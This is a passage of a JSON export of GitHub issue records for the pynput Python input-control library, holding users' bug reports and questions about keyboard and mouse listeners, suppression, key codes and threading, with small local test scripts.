"https://api.github.com/users/alexisdal/gists{/gist_id}", "starred_url": "https://api.github.com/users/alexisdal/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/alexisdal/subscriptions", "organizations_url": "https://api.github.com/users/alexisdal/orgs", "repos_url": "https://api.github.com/users/alexisdal/repos", "events_url": "https://api.github.com/users/alexisdal/events{/privacy}", "received_events_url": "https://api.github.com/users/alexisdal/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-06-16T14:43:51Z", "updated_at": "2020-06-16T16:43:13Z", "closed_at": "2020-06-16T16:43:12Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hello,\r\n\r\nI'm using a java based UI application to send keyboard strokes to a legacy webapp. In a nutshell, the legacy app was design for a mouse/keyboard/usb_scanner context, and we want to use a touchscreen instead of having people scanning barcodes on table with a sub scanner.\r\n\r\nTherefore, that app allows to send keyboard events as-if they had been scanned with a USB barcode reader...\r\n\r\nI want to use a keylogger in python to trigger specific actions when specific keyboard events are received (typically sequences of keys like ***1***).\r\n\r\npynput does capture all such events. but what i receive '\\x16' key strokes regarless of the key being typed... \r\ncode\r\n\r\n```\r\nfrom pynput.keyboard import Key, Listener\r\n\r\ndef on_press(key):\r\n    print(\"{0} on_press\".format(key))\r\n    \r\ndef on_release(key):\r\n    print(\"{0} released\".format(key))\r\n    if key == Key.esc:\r\n        return False\r\n    \r\nwith Listener(on_press=on_press, on_release=on_release) as listener:\r\n    listener.join()\r\n```\r\n\r\ntypical output (ex: for letter 'a', but it seems to be the same for all keys)\r\n\r\n```\r\nKey.ctrl_l on_press\r\n'\\x16' on_press\r\n'\\x16' released\r\nKey.ctrl_l released\r\n```\r\n\r\n\r\ni'm using python 3.6 in windows 10. pynput was installed with pip this morning. v1.6.8\r\n\r\n\r\n(for the record, Autohokey does capture all key events normally but it sucks to code in ahk, i would prefer to use python/pynput instead, which is *much* nicer to use)", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/276", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/276/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/276/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/276/events", "html_url": "https://github.com/moses-palmer/pynput/issues/276", "id": 637762484, "node_id": "MDU6SXNzdWU2Mzc3NjI0ODQ=", "number": 276, "title": "Queue error on Synchronous event Listening", "user": {"login": "tangonaf", "id": 24877605, "node_id": "MDQ6VXNlcjI0ODc3NjA1", "avatar_url": "https://avatars3.githubusercontent.com/u/24877605?v=4", "gravatar_id": "", "url": "https://api.github.com/users/tangonaf", "html_url": "https://github.com/tangonaf", "followers_url": "https://api.github.com/users/tangonaf/followers", "following_url": "https://api.github.com/users/tangonaf/following{/other_user}", "gists_url": "https://api.github.com/users/tangonaf/gists{/gist_id}", "starred_url": "https://api.github.com/users/tangonaf/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/tangonaf/subscriptions", "organizations_url": "https://api.github.com/users/tangonaf/orgs", "repos_url": "https://api.github.com/users/tangonaf/repos", "events_url": "https://api.github.com/users/tangonaf/events{/privacy}", "received_events_url": "https://api.github.com/users/tangonaf/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-06-12T13:47:43Z", "updated_at": "2020-06-13T08:00:56Z", "closed_at": "2020-06-13T08:00:56Z", "author_association": "NONE", "active_lock_reason": null, "body": "Error:\r\n> event = events.get(1.0)\r\n>   File \"/home/pi/.local/lib/python3.5/site-packages/pynput/_util/__init__.py\", line 277, in get\r\n>     event = self._event_queue.get(timeout=timeout)\r\n>   File \"/usr/lib/python3.5/queue.py\", line 172, in get\r\n>     raise Empty\r\n> queue.Empty\r\n\r\nCode:\r\n```\r\nfrom pynput import keyboard\r\n\r\n\r\ndef check_key_pressed():\r\n    print(\"getting in check_key_pressed\")\r\n    print(keyboard.Events())\r\n    with keyboard.Events() as events:\r\n        print(\"getting in check_key_pressed with\")\r\n        # Block at most one second\r\n        event = events.get(1.0)\r\n        if event is None:\r\n            print('You did not press a key within one second')\r\n            return False\r\n        else:\r\n            print('Key {0} pressed'.format(event.key))\r\n            return True\r\n\r\n\r\nwhile True:\r\n    check_key_pressed()\r\n```\r\n\r\nSystem:\r\n\r\n> PRETTY_NAME=\"Raspbian GNU/Linux 9 (stretch)\"\r\n> NAME=\"Raspbian GNU/Linux\"\r\n> VERSION_ID=\"9\"\r\n> VERSION=\"9 (stretch)\"\r\n> ID=raspbian\r\n> ID_LIKE=debian\r\n> HOME_URL=\"http://www.raspbian.org/\"\r\n> SUPPORT_URL=\"http://www.raspbian.org/RaspbianForums\"\r\n> BUG_REPORT_URL=\"http://www.raspbian.org/RaspbianBugs\"", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/275", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/275/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/275/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/275/events", "html_url": "https://github.com/moses-palmer/pynput/issues/275", "id": 632161284, "node_id": "MDU6SXNzdWU2MzIxNjEyODQ=", "number": 275, "title": "When Suppress=True, X crashes ", "user": {"login": "vipow", "id": 11372270, "node_id": "MDQ6VXNlcjExMzcyMjcw", "avatar_url": "https://avatars1.githubusercontent.com/u/11372270?v=4", "gravatar_id": "", "url": "https://api.github.com/users/vipow", "html_url": "https://github.com/vipow", "followers_url": "https://api.github.com/users/vipow/followers", "following_url": "https://api.github.com/users/vipow/following{/other_user}", "gists_url": "https://api.github.com/users/vipow/gists{/gist_id}", "starred_url": "https://api.github.com/users/vipow/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/vipow/subscriptions", "organizations_url": "https://api.github.com/users/vipow/orgs", "repos_url": "https://api.github.com/users/vipow/repos", "events_url": "https://api.github.com/users/vipow/events{/privacy}", "received_events_url": "https://api.github.com/users/vipow/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-06-06T03:06:19Z", "updated_at": "2020-07-06T22:17:09Z", "closed_at": "2020-07-06T22:17:09Z", "author_association": "NONE", "active_lock_reason": null, "body": "Environment: Ubuntu20.04 (running on Windows10 Pro with VMware Workstation Player 15)\r\n\r\n\r\nsample.py\r\n```python3\r\nfrom pynput import mouse\r\n\r\ndef on_move(x, y):\r\n    print('Pointer moved to {0}'.format(\r\n        (x, y)))\r\n\r\ndef on_click(x, y, button, pressed):\r\n    print('{0} at {1}'.format(\r\n        'Pressed' if pressed else 'Released',\r\n        (x, y)))\r\n    if not pressed:\r\n        # Stop listener\r\n        return False\r\ndef on_scroll(x, y, dx, dy):\r\n    print('Scrolled {0} at {1}'.format(\r\n        'down' if dy < 0 else 'up',\r\n        (x, y)))\r\n\r\n# Collect events until released\r\nwith mouse.Listener(\r\n        on_move=on_move,\r\n        on_click=on_click,\r\n        on_scroll=on_scroll,\r\n        suppress=True\r\n        ) as listener:\r\n    listener.join()\r\n\r\n```\r\n\r\n\r\n```\r\n$ python3 sample.py \r\nPointer moved to (295, 945)\r\nPointer moved to (295, 947)\r\nPointer moved to (294, 951)\r\nPointer moved to (294, 953)\r\nPointer moved to (295, 956)\r\nPointer moved to (295, 957)\r\nPressed at (295, 957)\r\nReleased at (295, 957)\r\n$\r\n```\r\n\r\nFirst start the sample program as above, then click to exit.\r\nAfter that, when I do a few operations, such as starting firefox, it always logs out suddenly.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/273", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/273/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/273/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/273/events", "html_url": "https://github.com/moses-palmer/pynput/issues/273", "id": 631627299, "node_id": "MDU6SXNzdWU2MzE2MjcyOTk=", "number": 273, "title": "creating keyboard listener on Xorg  with suppress=True too greedy", "user": {"login": "shark-low", "id": 66478393, "node_id": "MDQ6VXNlcjY2NDc4Mzkz", "avatar_url": "https://avatars0.githubusercontent.com/u/66478393?v=4", "gravatar_id": "", "url": "https://api.github.com/users/shark-low", "html_url": "https://github.com/shark-low", "followers_url": "https://api.github.com/users/shark-low/followers", "following_url": "https://api.github.com/users/shark-low/following{/other_user}", "gists_url": "https://api.github.com/users/shark-low/gists{/gist_id}", "starred_url": "https://api.github.com/users/shark-low/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/shark-low/subscriptions", "organizations_url": "https://api.github.com/users/shark-low/orgs", "repos_url": "https://api.github.com/users/shark-low/repos", "events_url": "https://api.github.com/users/shark-low/events{/privacy}", "received_events_url": "https://api.github.com/users/shark-low/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-06-05T14:16:43Z", "updated_at": "2020-07-06T22:57:03Z", "closed_at": "2020-07-06T22:57:03Z", "author_association": "NONE", "active_lock_reason": null, "body": "When adding a \"hotkey\" to execute a function, I don't want that same hotkey to be echoed where it's been pressed. So I took a look into suppression but, with this code:\r\n\r\n```python\r\nfrom pynput import keyboard\r\n\r\ncurrent = set()\r\nCOMBINATIONS = [\r\n    {keyboard.Key.shift, keyboard.KeyCode(char='p')},\r\n    {keyboard.Key.shift, keyboard.KeyCode(char='P')}\r\n]\r\n\r\ndef execute():\r\n    print('honk honk\\n')\r\n\r\ndef on_press(key):\r\n    if any([key in COMBO for COMBO in COMBINATIONS]):\r\n        current.add(key)\r\n        if any(all(k in current for k in COMBO) for COMBO in COMBINATIONS):\r\n            execute()\r\n\r\ndef on_release(key):\r\n    if any([key in COMBO for COMBO in COMBINATIONS]):\r\n        current.remove(key)\r\n\r\nwith keyboard.Listener(on_press=on_press, on_release=on_release, suppress=True) as listener:\r\n    listener.join()\r\n```\r\n\r\n...the whole keyboard is grabbed. Meaning I can't type anything in any window, not even ctrl+c to break. I'm using i3 on .Org X Server 1.20.8 . \r\n\r\nI've seen issue #121 but it's not getting love anymore and I don't know how to reopen an issue like stated in there. Is there some way to suppress only the defined keys so they don't echo where they're pressed ?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/272", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/272/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/272/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/272/events", "html_url": "https://github.com/moses-palmer/pynput/issues/272", "id": 631524924, "node_id": "MDU6SXNzdWU2MzE1MjQ5MjQ=", "number": 272, "title": "Simplify Press/Release into Tap function", "user": {"login": "adamrybak", "id": 32214327, "node_id": "MDQ6VXNlcjMyMjE0MzI3", "avatar_url": "https://avatars3.githubusercontent.com/u/32214327?v=4", "gravatar_id": "", "url": "https://api.github.com/users/adamrybak", "html_url": "https://github.com/adamrybak", "followers_url": "https://api.github.com/users/adamrybak/followers", "following_url": "https://api.github.com/users/adamrybak/following{/other_user}", "gists_url": "https://api.github.com/users/adamrybak/gists{/gist_id}", "starred_url": "https://api.github.com/users/adamrybak/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/adamrybak/subscriptions", "organizations_url": "https://api.github.com/users/adamrybak/orgs", "repos_url": "https://api.github.com/users/adamrybak/repos", "events_url": "https://api.github.com/users/adamrybak/events{/privacy}", "received_events_url": "https://api.github.com/users/adamrybak/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-06-05T11:36:05Z", "updated_at": "2020-07-06T22:48:58Z", "closed_at": "2020-07-06T22:48:58Z", "author_association": "NONE", "active_lock_reason": null, "body": "Feature request for a new helper function:\r\n\r\nkeyboard.tap(Key.space)\r\n\r\nis equivalent to performing\r\n\r\nkeyboard.press(Key.space)\r\nkeyboard.release(Key.space)", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/270", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/270/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/270/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/270/events", "html_url": "https://github.com/moses-palmer/pynput/issues/270", "id": 629897992, "node_id": "MDU6SXNzdWU2Mjk4OTc5OTI=", "number": 270, "title": "[Help] How do I not use threads?", "user": {"login": "Ipsoka", "id": 66363962, "node_id": "MDQ6VXNlcjY2MzYzOTYy", "avatar_url": "https://avatars3.githubusercontent.com/u/66363962?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Ipsoka", "html_url": "https://github.com/Ipsoka", "followers_url": "https://api.github.com/users/Ipsoka/followers", "following_url": "https://api.github.com/users/Ipsoka/following{/other_user}", "gists_url": "https://api.github.com/users/Ipsoka/gists{/gist_id}", "starred_url": "https://api.github.com/users/Ipsoka/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Ipsoka/subscriptions", "organizations_url": "https://api.github.com/users/Ipsoka/orgs", "repos_url": "https://api.github.com/users/Ipsoka/repos", "events_url": "https://api.github.com/users/Ipsoka/events{/privacy}", "received_events_url": "https://api.github.com/users/Ipsoka/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-06-03T10:56:11Z", "updated_at": "2020-06-03T11:07:40Z", "closed_at": "2020-06-03T11:07:39Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi,\r\nsimple question. I dont want to use multithreading here. I am using pynputs keyboard listener to controll the flow of my program. The problem occurs with the threading, because one function requiers a user input via input() which should only be run in the main thread. Doing not so somehow ends up lagging the inputs. I found a solution to that, which seems quiet bad, which is: I use a queue where I put in elements when pressing certain keys. The main thread has a while True loop waiting for new entries in the queue via the queues .get() function.\r\nIs there a way to not use threading here and simple send the keys pressed to the main thread?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/268", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/268/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/268/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/268/events", "html_url": "https://github.com/moses-palmer/pynput/issues/268", "id": 627821770, "node_id": "MDU6SXNzdWU2Mjc4MjE3NzA=", "number": 268, "title": "Triggering mouse and keyboard in a specific window", "user": {"login": "noodlez04", "id": 12860839, "node_id": "MDQ6VXNlcjEyODYwODM5", "avatar_url": "https://avatars0.githubusercontent.com/u/12860839?v=4", "gravatar_id": "", "url": "https://api.github.com/users/noodlez04", "html_url": "https://github.com/noodlez04", "followers_url": "https://api.github.com/users/noodlez04/followers", "following_url": "https://api.github.com/users/noodlez04/following{/other_user}", "gists_url": "https://api.github.com/users/noodlez04/gists{/gist_id}", "starred_url": "https://api.github.com/users/noodlez04/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/noodlez04/subscriptions", "organizations_url": "https://api.github.com/users/noodlez04/orgs", "repos_url": "https://api.github.com/users/noodlez04/repos", "events_url": "https://api.github.com/users/noodlez04/events{/privacy}", "received_events_url": "https://api.github.com/users/noodlez04/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-05-30T21:07:39Z", "updated_at": "2020-05-31T18:33:14Z", "closed_at": "2020-05-31T18:33:14Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi,\r\nI've read the README and the issues, and haven't found a clear answer for this question:\r\nIs it possible to trigger mouse and keyboard clicks to a specific window, even if it is not the focused one?\r\n\r\nThanks!", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/266", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/266/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/266/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/266/events", "html_url": "https://github.com/moses-palmer/pynput/issues/266", "id": 622677937, "node_id": "MDU6SXNzdWU2MjI2Nzc5Mzc=", "number": 266, "title": "I have been trying for days but this library keeps crashing my raspberry pi", "user": {"login": "PauloFDO", "id": 12493731, "node_id": "MDQ6VXNlcjEyNDkzNzMx", "avatar_url": "https://avatars0.githubusercontent.com/u/12493731?v=4", "gravatar_id": "", "url": "https://api.github.com/users/PauloFDO", "html_url": "https://github.com/PauloFDO", "followers_url": "https://api.github.com/users/PauloFDO/followers", "following_url": "https://api.github.com/users/PauloFDO/following{/other_user}", "gists_url": "https://api.github.com/users/PauloFDO/gists{/gist_id}", "starred_url": "https://api.github.com/users/PauloFDO/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/PauloFDO/subscriptions", "organizations_url": "https://api.github.com/users/PauloFDO/orgs", "repos_url": "https://api.github.com/users/PauloFDO/repos", "events_url": "https://api.github.com/users/PauloFDO/events{/privacy}", "received_events_url": "https://api.github.com/users/PauloFDO/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-05-21T18:02:36Z", "updated_at": "2020-05-31T18:40:03Z", "closed_at": "2020-05-31T18:40:02Z", "author_association": "NONE", "active_lock_reason": null, "body": "So, I really want to use this library but I'm having big problems with it, as soon as it creates 3 or 4 threads my raspberry pi dies, even if I try to close them with the . stop, I tried everything I could find or think about, I got this to work properly by its own and that made me very happy, but I also need to use input() so now I need to stop it (or it blocks everything) and my problems are back...\r\n\r\nthis is my code, which works perfectly fine and never crashes anything if I don't need the keyboard for anything else:\r\n\r\n```\r\nlistener = None\r\nlistener = None\r\n\r\ndef on_press(key):\r\n    if AllowKeys:\r\n        if key == Key.enter:\r\n            global saveFile\r\n            saveFile = True  \r\n\r\ndef on_release(key):\r\n    global xPosition\r\n    global yPosition\r\n    global zPosition\r\n\r\n    if hasattr(key, 'char'):\r\n        if key.char == ('d'):\r\n            xPosition -= 0.03\r\n        elif key.char == ('a'):\r\n            xPosition += 0.03\r\n        elif key.char == ('w'):\r\n            zPosition += 0.03    \r\n        elif key.char == ('s'):\r\n            zPosition -= 0.03\r\n        elif key.char == ('q'):\r\n            yPosition += 0.03   \r\n        elif key.char == ('e'):\r\n            yPosition -= 0.03   \r\n\r\ndef CheckIfEnterIsPressedToStorePosition(currentPosition):\r\n    global vector3\r\n    global listener\r\n    vector3 = currentPosition\r\n    print(\"starting\")\r\n\r\n    if listener == None:  \r\n        listener = Listener(on_press=on_press, on_release=on_release,suppress=True)\r\n        listener.start()\r\n\r\n    if saveFile:\r\n        SaveFile()\r\n```\r\n\r\nnow I need to use input() for a file name, so I thought about doing this:\r\n\r\n\r\n```\r\ndef BlockKeys():\r\n    global listener\r\n    listener.stop()\r\n    listener = None\r\n\r\ndef SaveFile():\r\n    global saveFile\r\n    BlockKeys()\r\n    saveFile = False\r\n    fileName = InputFileName()\r\n    fileManager.StoreMotorPositionInFile(fileName,Speed(),HandMovement(),vector3)\r\n```\r\n\r\n\r\n\r\nso it stops the listener and repeats the cycle, but as mentioned as soon as it calls this line of code 3 or 4 times everything crashes:\r\n\r\n```\r\nlistener = Listener(on_press=on_press, on_release=on_release,suppress=True)\r\nlistener.start()\r\n```\r\n\r\nI tried so many things over the last days and tried every solution I could see in the documentation but couldn't get anything to work, is pynput suppose to completely block Input()?\r\n\r\nI also try the \"with\" and \"listener.join\" options, and I have the same problem (as soon as I press a key 4-5 times it will crash,plus a need a non blocking option)", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/264", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/264/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/264/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/264/events", "html_url": "https://github.com/moses-palmer/pynput/issues/264", "id": 619385124, "node_id": "MDU6SXNzdWU2MTkzODUxMjQ=", "number": 264, "title": "differen vk codes on mac vs linux", "user": {"login": "MarcTheSpark", "id": 10521939, "node_id": "MDQ6VXNlcjEwNTIxOTM5", "avatar_url": "https://avatars3.githubusercontent.com/u/10521939?v=4", "gravatar_id": "", "url": "https://api.github.com/users/MarcTheSpark", "html_url": "https://github.com/MarcTheSpark", "followers_url": "https://api.github.com/users/MarcTheSpark/followers", "following_url": "https://api.github.com/users/MarcTheSpark/following{/other_user}", "gists_url": "https://api.github.com/users/MarcTheSpark/gists{/gist_id}", "starred_url": "https://api.github.com/users/MarcTheSpark/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/MarcTheSpark/subscriptions", "organizations_url": "https://api.github.com/users/MarcTheSpark/orgs", "repos_url": "https://api.github.com/users/MarcTheSpark/repos", "events_url": "https://api.github.com/users/MarcTheSpark/events{/privacy}", "received_events_url": "https://api.github.com/users/MarcTheSpark/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-05-16T05:38:21Z", "updated_at": "2020-07-06T22:09:39Z", "closed_at": "2020-07-06T22:09:39Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi -- I'm noticing that on my mac and linux computers I get totally different numbers for KeyCode.vk for the same key. For instance, on my mac the letter \"b\" has a vk of 1, and on linux (both Fedora and Ubuntu) it's 56. The same is true for Key.value.vk with special keys: On mac, Key.alt has a .value.vk of 58. On linux, it has .value.vk of 65513.\r\n\r\nWhat's going on here? To be honest, these seem like strange values in either case.\r\n\r\nIs this a bug? Is there a way to get a consistent key code that isn't platform-dependent? What I really want is a code that represents the key pressed, not the character it represents.\r\n\r\nThanks!", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/262", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/262/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/262/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/262/events", "html_url": "https://github.com/moses-palmer/pynput/issues/262", "id": 618444535, "node_id": "MDU6SXNzdWU2MTg0NDQ1MzU=", "number": 262, "title": "Pynput Crashes as soon as I press a \"  '  \" or a \"  \"  \"", "user": {"login": "Mauzepaus", "id": 65364076, "node_id": "MDQ6VXNlcjY1MzY0MDc2", "avatar_url": "https://avatars1.githubusercontent.com/u/65364076?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Mauzepaus", "html_url": "https://github.com/Mauzepaus", "followers_url": "https://api.github.com/users/Mauzepaus/followers", "following_url": "https://api.github.com/users/Mauzepaus/following{/other_user}", "gists_url": "https://api.github.com/users/Mauzepaus/gists{/gist_id}", "starred_url": "https://api.github.com/users/Mauzepaus/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Mauzepaus/subscriptions", "organizations_url": "https://api.github.com/users/Mauzepaus/orgs", "repos_url": "https://api.github.com/users/Mauzepaus/repos", "events_url": "https://api.github.com/users/Mauzepaus/events{/privacy}", "received_events_url": "https://api.github.com/users/Mauzepaus/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2020-05-14T18:23:53Z", "updated_at": "2020-05-16T06:39:50Z", "closed_at": "2020-05-16T06:39:50Z", "author_association": "NONE", "active_lock_reason": null, "body": " I get this error as soon as I press `'` or `\"` while using a listener:\r\n```\r\npynput\\keyboard\\_base.py\", line 54, in __init__\r\n    'COMBINING ' + unicodedata.name(self.char))\r\nKeyError: \"undefined character name 'COMBINING APOSTROPHE'\"\r\n```\r\nand at the same time this error:\r\n\r\n```\r\npynput\\keyboard\\_base.py\", line 56, in __init__\r\n    raise ValueError(self.char)\r\nValueError: '\r\n```\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/260", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/260/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/260/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/260/events", "html_url": "https://github.com/moses-palmer/pynput/issues/260", "id": 614917345, "node_id": "MDU6SXNzdWU2MTQ5MTczNDU=", "number": 260, "title": "Need help with issues in Stack Overflow", "user": {"login": "SLey3", "id": 44455382, "node_id": "MDQ6VXNlcjQ0NDU1Mzgy", "avatar_url": "https://avatars0.githubusercontent.com/u/44455382?v=4", "gravatar_id": "", "url": "https://api.github.com/users/SLey3", "html_url": "https://github.com/SLey3", "followers_url": "https://api.github.com/users/SLey3/followers", "following_url": "https://api.github.com/users/SLey3/following{/other_user}", "gists_url": "https://api.github.com/users/SLey3/gists{/gist_id}", "starred_url": "https://api.github.com/users/SLey3/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/SLey3/subscriptions", "organizations_url": "https://api.github.com/users/SLey3/orgs", "repos_url": "https://api.github.com/users/SLey3/repos", "events_url": "https://api.github.com/users/SLey3/events{/privacy}", "received_events_url": "https://api.github.com/users/SLey3/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-05-08T18:48:42Z", "updated_at": "2020-05-08T20:06:26Z", "closed_at": "2020-05-08T20:06:26Z", "author_association": "NONE", "active_lock_reason": null, "body": "I've recently began to use pynput and when I was testing on whether the module work, an error which I describe on the link below appeared:\r\nhttps://stackoverflow.com/questions/61670524/how-to-fix-a-traceback-and-attributeerror-when-it-involves-a-module\r\n\r\nCould this error be fixed and how can I fix this?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/258", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/258/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/258/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/258/events", "html_url": "https://github.com/moses-palmer/pynput/issues/258", "id": 612184613, "node_id": "MDU6SXNzdWU2MTIxODQ2MTM=", "number": 258, "title": "Problem entering unicode character", "user": {"login": "mroavi", "id": 19517248, "node_id": "MDQ6VXNlcjE5NTE3MjQ4", "avatar_url": "https://avatars2.githubusercontent.com/u/19517248?v=4", "gravatar_id": "", "url": "https://api.github.com/users/mroavi", "html_url": "https://github.com/mroavi", "followers_url": "https://api.github.com/users/mroavi/followers", "following_url": "https://api.github.com/users/mroavi/following{/other_user}", "gists_url": "https://api.github.com/users/mroavi/gists{/gist_id}", "starred_url": "https://api.github.com/users/mroavi/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/mroavi/subscriptions", "organizations_url": "https://api.github.com/users/mroavi/orgs", "repos_url": "https://api.github.com/users/mroavi/repos", "events_url": "https://api.github.com/users/mroavi/events{/privacy}", "received_events_url": "https://api.github.com/users/mroavi/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-05-04T21:36:06Z", "updated_at": "2020-07-23T08:26:10Z", "closed_at": "2020-07-23T08:26:10Z", "author_association": "NONE", "active_lock_reason": null, "body": "I haven't been able to emulate writing Unicode characters. Here is my attempt:\r\n\r\n```python\r\nfrom pynput.keyboard import Key, Controller\r\n\r\nkeyboard = Controller()\r\n\r\nkeyboard.type(u'\\u03C9')\r\nkeyboard.type('\u03c9')\r\n```\r\nThis program doesn't generate any output (also no errors). I read through all the issues regarding Unicode problems but couldn't find a solution. \r\n\r\nI'm running Ubuntu:\r\n```bash\r\n$ cat /proc/sys/kernel/{ostype,osrelease,version}\r\nDistributor ID: Ubuntu\r\nDescription:    Ubuntu 18.04.4 LTS\r\nRelease:        18.04\r\nCodename:       bionic\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/257", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/257/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/257/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/257/events", "html_url": "https://github.com/moses-palmer/pynput/issues/257", "id": 611479971, "node_id": "MDU6SXNzdWU2MTE0Nzk5NzE=", "number": 257, "title": "Xmodmap interferes with keyboard", "user": {"login": "simonwilmes", "id": 29949697, "node_id": "MDQ6VXNlcjI5OTQ5Njk3", "avatar_url": "https://avatars1.githubusercontent.com/u/29949697?v=4", "gravatar_id": "", "url": "https://api.github.com/users/simonwilmes", "html_url": "https://github.com/simonwilmes", "followers_url": 